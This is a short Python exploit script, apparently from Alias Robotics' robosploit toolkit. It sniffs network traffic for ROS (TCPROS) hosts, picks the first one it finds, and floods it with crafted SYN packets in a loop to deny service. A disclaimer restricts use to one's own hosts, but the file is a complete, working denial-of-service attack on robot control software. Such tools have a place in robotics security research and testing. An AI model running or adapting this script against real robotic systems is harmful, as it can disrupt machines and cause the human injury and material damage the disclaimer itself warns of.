"""
SYN-ACK DoS attack for ROS

DISCLAIMER: Use against your own hosts only! By no means Alias Robotics
or the authors of this exploit encourage or promote the unauthorized tampering
with running robotic systems. This can cause serious human harm and material
damages.
"""

import sys
from scapy.all import *
import scapy.all as scapy
from robosploit.modules.generic.robotics.all import *
from operator import itemgetter 

# bind layers so that packages are recognized as TCPROS
bind_layers(TCP, TCPROS)

print("Capturing network traffic...")
packages = sniff(iface="eth0", filter="tcp", count=20)
targets = {}
for p in packages[TCPROSBody]:
    # Filter by ip
    # if p[IP].src == "12.0.0.2":
    port = p.sport
    ip = p[IP].src
    if ip in targets.keys():
        targets[ip].append(port)
    else:
        targets[ip] = [port]

# Get unique values:
for t in targets.keys():
    targets[t] = list(set(targets[t]))

# Select one of the targets
dst_target = list(map(itemgetter(0), targets.items()))[0]
dport_target = targets[dst_target]

# Small fix to meet scapy syntax on "dport" key
#  if single value, cannot go as a list
if len(dport_target) < 2:
    dport_target = dport_target[0]

p=IP(dst=dst_target,id=1111,ttl=99)/TCP(sport=RandShort(),dport=dport_target,seq=1232345,ack=10000,window=10000,flags="S")/"Alias Robotics SYN Flood DoS"
ls(p)
ans,unans=srloop(p,inter=0.05,retry=2,timeout=4)